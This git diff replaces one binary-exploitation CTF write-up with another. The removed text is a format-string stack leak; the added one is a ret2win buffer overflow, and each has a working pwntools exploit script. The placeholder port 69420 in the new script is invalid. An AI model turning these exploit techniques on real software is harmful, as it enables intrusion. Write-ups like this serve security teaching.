@@ -1,36 +1,41 @@
-# E.L.I.A
+# Unpwnable Shop
 ## Challenge
-This challenge first reads the flag from the file `flag.txt` and saves it on the **stack**. Then, it requests input from the user and subsequently prints it insecurely using `printf` without any **defined format**.
+This challenge lets us **insert our name** to access the shop. looking closely we can see that the **limit** of our input is positioned just after our name in the **stack** and also its initial value is 81! just enough to insert our name and **overwrite the limit** for later.
+After inserting our name the program asks us what do we want to do, if we answer 69 we access a unique dialogue that makes us **re-input our name**, but this time the limit is whatever we inserted before, so if we send 88 bytes (76 for the username, 4 for the limit and 8 for the rbp), and the **address of the 'win' function** we successfully **overwrite** the return address and get the flag.
 
-This executable can therefore be exploited if the correct offsets on the stack of the flag (from 8 to 13) are found and used together with `%p` in the format `%x$p` where *x* is the offset.
+**Vulnerability**: [ret-to-win](https://book.hacktricks.xyz/binary-exploitation/stack-overflow/ret2win)
+
 
 ## Solution
 ```py
 #!/usr/bin/env python3
-from pwn import args, remote, process
+from pwn import *
 
-# Change this to remote if you want to run it on remote server
 if args.REMOTE:
-    r = remote('localhost', 1337) # change host and port
+    r = remote('localhost', 69420) #Change host and port
 else:
-    r = process('./pwn2')
+    r = process("./pwn2")
 
-r.recvuntil(b'?\n')
-PAYLOAD = b''
-for i in range(8, 13):
-    PAYLOAD += f'%{i}$p'.encode()
+elf = ELF("./pwn2")
 
-r.sendline(PAYLOAD)
-flag = [int(i, 16) for i in r.recvline().decode().split('0x')[1:]]
-pascal = ''
-for i in flag:
-    pascal += i.to_bytes(8, 'little').decode()
+# Overwriting limit
+r.recvuntil(b':')
+r.sendline(b'a' * 76 + p32(96))                                            
 
-pascal = pascal.replace('\x00', '')
-print(pascal)
+# Sending right choice
+r.recvuntil(b'stuff')
+r.sendline(b'69')
+
+#Overwriting return address
+r.recvuntil(b'it.')
+r.sendline(b'a'*88 + p64(elf.sym['win']))
+r.recvuntil(b'Bye!\n')
+
+#Flag!
+print(r.recvline().decode())     
 ```
 
 ## Author
-**Author**: [`@AlBovo`](https://github.com/AlBovo/) <br>
-**Date**: 2024-07-19 <br>
+**Author**: [`@Mark-74`](https://github.com/Mark-74/) <br>
+**Date**: 2024-08-12 <br>
 **Category**: Binary Exploitation
